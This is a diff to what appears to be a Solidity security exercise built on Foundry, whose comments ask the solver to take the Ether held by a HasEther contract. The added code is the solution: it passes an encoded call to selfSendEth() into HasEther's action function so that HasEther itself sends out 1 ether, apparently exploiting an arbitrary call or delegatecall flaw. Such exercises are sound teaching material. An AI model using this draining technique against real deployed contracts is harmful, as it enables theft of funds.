@@ -4,11 +4,21 @@ pragma solidity 0.8.28;
 import {console} from "forge-std/console.sol";
 
 contract GetEther {
+
+    receive() external payable {
+
+    }
+
+    function selfSendEth() external {
+        (bool success, ) = msg.sender.call{value: 1 ether}("");
+        require(success, "failed!");
+    }
     // write any code you like inside this contract, but only this contract
     // get the Ether from the HasEther contract. You may not modify the test
     
     function getEther(HasEther hasEther) external {
-        //...
+        bytes memory dada = abi.encodeWithSignature("selfSendEth()");
+        hasEther.action(address(this), dada);
     }
 }
 
